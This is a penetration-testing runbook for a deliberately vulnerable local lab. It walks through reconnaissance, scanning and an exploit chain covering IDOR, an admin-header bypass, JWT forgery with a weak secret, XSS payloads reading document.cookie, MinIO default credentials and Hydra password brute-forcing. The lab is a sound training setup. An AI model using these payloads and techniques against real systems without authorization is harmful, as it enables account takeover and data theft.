# Acme Lab Testing Methodology

This runbook applies a practical bug bounty workflow to the local `localbugbountylabendtoend` environment.

## Target Scope

- `app.acme.local:8080`
- `api.acme.local:8081`
- `admin.acme.local:8082`
- `storage.acme.local:9000`
- `storage.acme.local:9001`
- `localhost:3306`

## 1. Reconnaissance

Goal: discover services, technologies, and exposed attack surface before manual testing.

### Nmap

```bash
nmap -Pn -sV -sC -p 8080,8081,8082,9000,9001,3306 127.0.0.1
```

Expected findings:

- `8080` Node/Express front end
- `8081` Node/Express API
- `8082` Node/Express admin panel
- `9000` MinIO object storage
- `9001` MinIO console
- `3306` MySQL

### Manual enumeration

```bash
curl http://app.acme.local:8080/
curl http://api.acme.local:8081/api/user?id=1
curl http://storage.acme.local:9000/public-assets/security-note.txt
```

What to look for:

- service names and internal links exposed by the front end
- leaked emails and usernames from `GET /api/user?id=`
- public bucket exposure in MinIO

### theHarvester

For this isolated local lab, `theHarvester` has limited value because there is no real public DNS, search-engine footprint, or certificate transparency data. Use it only if you later publish the lab behind a real domain.

## 2. Vulnerability Scanning

Goal: automatically identify obvious misconfigurations and weak web behavior.

### Nikto

```bash
nikto -h http://app.acme.local:8080
nikto -h http://api.acme.local:8081
nikto -h http://admin.acme.local:8082
```

Focus areas:

- missing hardening headers
- risky defaults
- information leakage

### OpenVAS / Greenbone

If installed:

```bash
sudo gvm-start
```

Then create a target for `127.0.0.1` and scan the exposed ports:

- `8080`
- `8081`
- `8082`
- `9000`
- `9001`
- `3306`

Expected results:

- outdated service banners
- exposed admin/storage interfaces
- weak/default credentials and open services

## 3. Exploitation

Goal: confirm the intentional flaws and chain them.

### IDOR

```bash
curl "http://api.acme.local:8081/api/user?id=1"
curl "http://api.acme.local:8081/api/user?id=2"
curl "http://api.acme.local:8081/api/user?id=3"
```

Success condition:

- user records are returned without any authorization check
- admin credentials and API key are disclosed

### Admin header bypass

```bash
curl -H role:admin "http://admin.acme.local:8082/export"
```

Success condition:

- sensitive user data and storage credentials are returned

### JWT tampering

Get a normal token:

```bash
curl -s -X POST http://api.acme.local:8081/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"welcome123"}'
```

Create an admin token with the weak secret:

```bash
node -e "console.log(require('jsonwebtoken').sign({sub:1,username:'alice',role:'admin',department:'engineering'}, 'secret123'))"
```

Use the tampered token:

```bash
curl http://api.acme.local:8081/api/admin \
  -H "Authorization: Bearer <PASTE_TOKEN_HERE>"
```

Success condition:

- the API trusts the forged `role: admin` claim and returns admin data

### XSS validation

Store a simple proof payload:

```bash
curl -X POST http://api.acme.local:8081/comment \
  -H "Content-Type: application/json" \
  -d '{"displayName":"tester","content":"<script>alert(document.cookie)</script>"}'
```

Or use the front-end comment form and reload:

- `http://app.acme.local:8080`

Also test reflected XSS:

- `http://app.acme.local:8080/profile?bio=<script>alert(document.cookie)</script>`

Success condition:

- the browser executes attacker-supplied script
- the readable `session` cookie is accessible to JavaScript

### MinIO misconfiguration

```bash
curl http://storage.acme.local:9000/public-assets/security-note.txt
```

Try the console:

- URL: `http://storage.acme.local:9001`
- credentials: `minioadmin / minioadmin`

Success condition:

- anonymous public access works
- default admin credentials work

## 4. Web Application Testing

Goal: inspect and modify browser/API traffic manually.

### Burp Suite

Use Burp to:

- intercept `POST /login`
- replay `GET /api/user?id=`
- modify the `id` parameter for IDOR
- add `role: admin` to requests to `admin.acme.local`
- inspect cookies and the JWT returned after login

### OWASP ZAP

Use ZAP to:

- spider `http://app.acme.local:8080`
- active-scan `app`, `api`, and `admin`
- confirm missing output encoding and risky header behavior

Recommended manual tests:

- comment submission with HTML/JS payloads
- profile preview with reflected payloads
- replay and edit login responses
- tamper JWT payload and resend to `/api/admin`

## 5. Password Attacks

Goal: test weak passwords and credential reuse.

### Hydra against the API login

Create a small wordlist:

```bash
printf "welcome123\nhunter2\nadminpass\npassword\nsecret123\n" > passwords.txt
printf "alice\nbob\nadmin\n" > users.txt
```

Run Hydra:

```bash
hydra -L users.txt -P passwords.txt \
  127.0.0.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=invalid credentials" \
  -s 8081
```

Expected findings:

- valid credentials for seeded users
- evidence of weak passwords and credential predictability

### John the Ripper

In the current version of the lab, passwords are exposed in plaintext through the IDOR and admin export, so John is not necessary. If you later change the lab to store hashes, dump those hashes and run:

```bash
john hashes.txt --wordlist=passwords.txt
```

## Recommended Attack Chain Order

1. Use Nmap and manual browsing to map services.
2. Use Nikto and manual inspection to find weak headers and exposed panels.
3. Exploit IDOR to leak admin details.
4. Bypass the admin panel with `role: admin`.
5. Forge a JWT with `secret123` and access `/api/admin`.
6. Validate stored or reflected XSS against the front end.
7. Use Hydra to prove weak-password exposure on `/login`.
8. Use MinIO default credentials and the public bucket to extend impact.

## Reporting Template

For each finding, record:

- title
- affected service and endpoint
- severity
- proof of concept
- impact
- exploit chain
- remediation notes

Suggested finding titles:

- IDOR on `GET /api/user?id=`
- Broken access control on `admin.acme.local`
- Weak JWT signing and privilege escalation
- Stored and reflected XSS in front end
- MinIO public bucket and default credentials
- Weak password policy on API login
